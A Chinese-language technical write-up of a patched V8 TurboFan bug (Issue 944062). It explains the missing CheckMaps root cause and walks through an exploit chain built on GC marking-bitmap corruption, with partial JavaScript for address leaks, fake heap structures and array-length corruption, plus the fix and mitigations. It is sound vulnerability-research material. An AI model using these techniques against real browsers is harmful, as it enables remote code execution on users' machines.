---
title: 'V8 Issue 944062: TurboFan ReduceArrayIndexOfIncludes 优化缺陷与 GC Marking Bitmap
  任意地址写利用链'
description: 深度分析 V8 TurboFan JIT 编译器中 ReduceArrayIndexOfIncludes 优化阶段遗漏 kUnreliableReceiverMaps
  检查导致的 OOB 读漏洞，结合 V8 垃圾回收机制中的 Marking Bitmap 操作，通过伪造 Space 元数据与字符串 Flatten 操作泄露对象地址，最终实现任意地址写与稳定越界读写原语的完整利用链。
category: program-analysis
tags:
- V8
- TurboFan
- JIT Compilation
- Vulnerability Analysis
- Browser Exploitation
- Garbage Collection
- Marking Bitmap
- OOB Read
- Arbitrary Write
- Issue 944062
date: '2019-05-01'
updated: '2026-11-12'
---

## 漏洞背景与成因

### TurboFan 内联优化逻辑

V8 TurboFan 在 Inlining 阶段会对 `Array.prototype.indexOf` 与 `Array.prototype.includes` 进行优化，由 `ReduceArrayIndexOfIncludes` 负责处理（`src/compiler/js-call-reducer.cc`）。优化流程：

1. 通过 `NodeProperties::InferReceiverMaps` 根据 receiver 与 effect 链推测可能的 Map 集合
2. 调用 `CanInlineArrayIteratingBuiltin` 根据 Map 推导 `ElementsKind`
3. 若可内联，则获取对应 Builtins 方法，提取数组元素指针、长度等属性传递给 Builtins 执行

### 核心缺陷：遗漏 `kUnreliableReceiverMaps` 处理

`InferReceiverMapsResult` 有三种取值：

| 枚举值 | 含义 |
|--------|------|
| `kNoReceiverMaps` | 无法推测 Map |
| `kReliableReceiverMaps` | 推测可靠，Map 不会变更 |
| `kUnreliableReceiverMaps` | 推测出 Map，但后续执行中可能被更改 |

原代码仅处理 `kNoReceiverMaps` 直接返回 `NoChange()`，**未对 `kUnreliableReceiverMaps` 插入 `CheckMaps` 节点**。若在优化代码执行期间，数组从 **Fast Elements**（线性存储）转为 **Slow Elements**（哈希表存储），后续仍按 Fast Elements 布局读取元素与长度，导致 **OOB 读**。

### 补丁逻辑

补丁在 `result == kUnreliableReceiverMaps` 时插入 `CheckMaps`，检测 Map 变更则 Deoptimize 回字节码执行。

## 利用链概览

漏洞仅提供「判断元素是否存在」的 OOB 读能力（返回索引而非值），无法直接读写任意内存。完整利用链分三阶段：

1. **ArrayBuffer Backing Storage 地址泄露** —— 借助 SMI 与 Double 数组暴力猜解高 16 位与低 32 位
2. **任意地址写** —— 伪造 Space 与 Marking Bitmap，利用 Minor GC 标记阶段修改目标数组 `length` 字段
3. **稳定越界读写原语** —— 获得 `corrupted_array` 后续构造任意读写、代码执行

> 后续通用利用路径（TypedArray 任意读写、WASM RWX 页面、Shellcode 执行）与 [[v8-turbofan-changeint32toint64-1day-analysis]]、[[google-ctf-2021-full-chain-v8-exploitation]] 类似，此处不再赘述。

## 阶段一：ArrayBuffer Backing Storage 地址泄露

### 高 16 位泄露（SMI 数组）

- V8 64 位架构下指针高 16 位固定为 `0x0000`，SMI 仅占高 32 位
- 创建大 ArrayBuffer（`2 << 26`）使其 Backing Storage 页对齐（低 12 位为 0）
- 通过 `__defineSetter__` 触发 Map 变更，利用 `indexOf` 暴力遍历 `0x0000~0xFFFF` 猜解高 16 位

```javascript
let high_bytes = 0;
smi_arr.__defineSetter__(i, () => {});  // 触发 Map 变更 → kUnreliableReceiverMaps
ab = new ArrayBuffer(2 << 26);           // 页对齐 Backing Storage
let smi_boundary = [1, 1, 1, 1];
for (high_bytes = 0; high_bytes < 0xffff; high_bytes++) {
    smi_boundary[0] = high_bytes;        // 防止过度越界
    if (smi_arr.indexOf(high_bytes, 0) === 20) break;  // 索引 20 对应 Backing Storage 指针
}
```

### 低 32 位泄露（Double 数组）

- Double 以 IEEE754 原始值存储，可精确表示 53 位整数
- 复用同一 `ArrayBuffer` 创建 `Uint32Array`，其中同样保存 Backing Storage 指针
- 步长 `0x1000`（页大小）遍历低 32 位，配合 `float_arr.indexOf` 定位

```javascript
float_arr.__defineSetter__(i, () => {});
let tmp = new Uint32Array(ab);           // 复用同一 Backing Storage
let float_boundary = [1.1, 1.1, 1.1, 1.1];
let start = address2float(BigInt(high_bytes) << 32n);
let end   = start + address2float(0x1000000n);  // 搜索 16MB 范围
for (let j = start; j < end; j += address2float(0x1000n)) {
    float_boundary[0] = j;
    if (float_arr.indexOf(j, 30) === 30) return [j, ...];  // 泄露完整指针
}
```

## 阶段二：任意地址写 —— GC Marking Bitmap 劫持

### V8 分代 GC 与 Marking Bitmap 机制

- **Young Generation** = Nursery + Intermediate，采用 **Semi-Space**（From-Space / To-Space）复制式 GC
- 每个 `MemoryChunk`（Page）头部含指向 **Marking Bitmap** 的指针
- Bitmap 每 2 bit 标记一个对象：`00=White(未访问)` `01=Grey(访问中)` `11=Black(访问完成)`
- Minor GC 扫描 From-Space 存活对象，复制到 To-Space 并**更新 Bitmap 对应位**

### 利用核心思路

1. 在可控的 `ArrayBuffer` 内存中**伪造 Space 元数据**，将其 `Marking Bitmap` 指针指向目标数组 `length` 字段附近
2. 在伪造 Space 上**分配对象**（通过伪造字符串触发 Flatten 分配）
3. 触发 **Minor GC**，GC 会在标记阶段向 Bitmap 写入 `0x11`（Black），恰好修改 `length` 字段某字节 `0x00 → 0x11`
4. 获得 `length` 被篡改的 `corrupted_array`，实现稳定越界读写

### 伪造 Space 元数据

```javascript
const SPACE_SIZE = 1n << 19n;                    // 512 KB per Space
const SPACE_MASK = 0xffffffffffffffffn ^ (SPACE_SIZE - 1n);
let space_start_addr = (ab_addr & SPACE_MASK) + SPACE_SIZE;
let space_start_off  = space_start_addr - ab_addr;

// 将伪造 Space 标记为 Young Generation（Offset 0x1 处）
u64[space_start_off / 8n + 0x1n] = 0x18n;
```

### 字符串 Flatten 泄露对象地址

为定位目标数组 `length` 字段偏移，需泄露堆对象地址。利用 **ConsString Flatten** 特性：

- `SeqOneByteString`：字面量字符串
- `ConsString`：多字符串拼接产生，含 `left`/`right` 子串指针
- `String::SlowEquals` 比较时，首字符与长度相同会触发 `Flatten`，在当前 Space 分配新字符串并替换子串指针

```javascript
// 伪造 SeqString 与 ConsString，置于伪造 Space 内
let seq_string = new SeqString([0x4141414141414141n]);
let root_string = new ConsString(1n, seq_string.addr, seq_string.addr);

// 触发 indexOf 越界读访问到伪造 ConsString，引发 Flatten
doit('A'.repeat(1), address2float(root_string.addr | 1n));

// Flatten 后，ConsString 的 left/right 被替换为新字符串地址
let corrupted_array_addr = u64[root_string.off + 2n] + 0x40n;  // 通过偏移计算
let backing_store_sz_addr = corrupted_array_addr + 0x18n;      // length 字段地址
```

### 精确控制 Bitmap 写入位置

- 计算 `backing_store_sz_addr` 相对伪造 Space Bitmap 基址的比特偏移
- 调整伪造对象大小与分配位置，使 GC 标记该对象时恰好翻转 `length` 字段目标字节
- 触发 GC（如分配大量临时对象），`corrupted_array.length` 变为 `0x11xxxxxx`，获得越界能力

## 阶段三：稳定越界读写与后续利用

获得 `corrupted_array` 后：

1. **任意地址读写**：通过修改相邻 `TypedArray` 的 `backing_store` 指针
2. **WASM RWX 内存**：写入 Shellcode 并跳转
3. **沙箱逃逸**：结合 MojoJS 或其他 IPC 机制（参考 [[google-ctf-2021-full-chain-v8-exploitation]]）

## 关键数据结构对照

| 结构 | 关键字段 | 偏移/用途 |
|------|----------|-----------|
| `MemoryChunk` (Page) | `marking_bitmap_` | 指向 Bitmap，GC 标记时写入 |
| `SeqOneByteString` | `length` `data[0]` | 伪造字符串内容与长度 |
| `ConsString` | `left` `right` | Flatten 时被替换为新字符串地址 |
| `JSArray` | `length` `elements` | 目标篡改字段，获得 OOB |

## 防御与缓解

| 缓解措施 | 效果 |
|----------|------|
| **补丁：`CheckMaps` 节点** | 根因修复，Map 变更时 Deoptimize |
| **Pointer Compression** | 压缩指针减少可泄露信息，但不阻断利用链 |
| **V8 Heap Sandbox** | 隔离堆内指针，增加伪造对象难度 |
| **GC 验证强化** | 对 Bitmap 写入范围校验，防止任意地址写 |

## 交叉引用

- [[v8-turbofan-changeint32toint64-1day-analysis]] — 另一 TurboFan 类型混淆漏洞，利用后期相似
- [[google-ctf-2021-full-chain-v8-exploitation]] — 完整链包含沙箱逃逸，后续利用可参考
- [[linux-kernel-hardening-mechanisms]] — 内核级 Marking Bitmap 与内存保护机制对比

## 参考资料

1. V8 Fast Properties & Elements Kind — <https://blog.crimx.com/2018/11/25/v8-fast-properties/>
2. 完整 Exp 代码 — <https://github.com/ray-cp/browser_pwn/tree/master/v8_pwn/issue-944062>
3. Google Project Zero 原文 — <https://googleprojectzero.blogspot.com/2019/05/trashing-flow-of-data.html>
4. V8 GC 导览 — <http://www.jayconrod.com/posts/55/a-tour-of-v8-garbage-collection>
5. 三色标记法 — <https://liujiacai.net/blog/2018/08/04/incremental-gc>
6. 分代 GC — <https://liujiacai.net/blog/2018/08/18/generational-gc>
7. Chromium Issue 944062 — <https://bugs.chromium.org/p/chromium/issues/detail?id=944062>

## 来源

- [0th3rs安全团队-201911-202204_041](../sources/0th3rs安全团队-201911-202204_041.md)
